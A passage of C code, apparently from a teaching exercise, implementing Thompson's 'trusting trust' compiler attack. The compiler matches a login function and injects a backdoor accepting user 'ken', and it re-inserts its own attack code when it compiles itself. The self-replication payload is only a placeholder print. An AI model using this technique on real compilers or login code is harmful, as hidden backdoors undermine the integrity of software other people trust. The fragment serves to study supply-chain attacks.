    int mod = 0;

    static char login_sig[] = "int login(char *user) {\n    ";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;\n    ";

    char *login_sig_pos = strstr(program, login_sig);

    if (login_sig_pos != NULL) {
        size_t insert_index = login_sig_pos - program + strlen(login_sig);
        size_t new_size = strlen(program) + strlen(login_attack);

        char attack_program[new_size];
        sprintf(attack_program, "%.*s%s%s", (int)insert_index, program, login_attack, login_sig_pos + strlen(login_sig));

        fprintf(fp, "%s", attack_program);
        fclose(fp);

        mod = 1;
    }

    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);\n";

    static char compile_attack[] 
              = "    printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);\n";

    char *compile_sig_pos = strstr(program, compile_sig);

    if (compile_sig_pos != NULL) {
        size_t insert_index = compile_sig_pos - program + strlen(compile_sig);
        size_t buffer_size = 8 * 1024 * 1024;

        char *attack_compiler = (char *)malloc(buffer_size);
        if (attack_compiler == NULL) {
            fprintf(stderr, "Memory allocation failed\n");
            exit(EXIT_FAILURE);
        }

        sprintf(attack_compiler, "%.*s", (int)insert_index, program);
        sprintf(attack_compiler + strlen(attack_compiler), "    char prog[] = {\n");
        for(int i = 0; prog[i]; i++)
             sprintf(attack_compiler + strlen(attack_compiler), "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
        sprintf(attack_compiler + strlen(attack_compiler), "0 };\n");
        sprintf(attack_compiler + strlen(attack_compiler), "%s%s%s", compile_attack, prog, compile_sig_pos + strlen(compile_sig));

        //sprintf(attack_compiler, "%.*s%s%s", (int)insert_index, program, compile_attack, compile_sig_pos + strlen(compile_sig));

        fprintf(fp, "%s", attack_compiler);
        fclose(fp);
        mod = 1;
    }

    if (mod){
        char buf[1024];
        sprintf(buf, "gcc ./temp-out.c -o %s", outname);
        if(system(buf) != 0)
            error("system failed\n");

        return;
    }
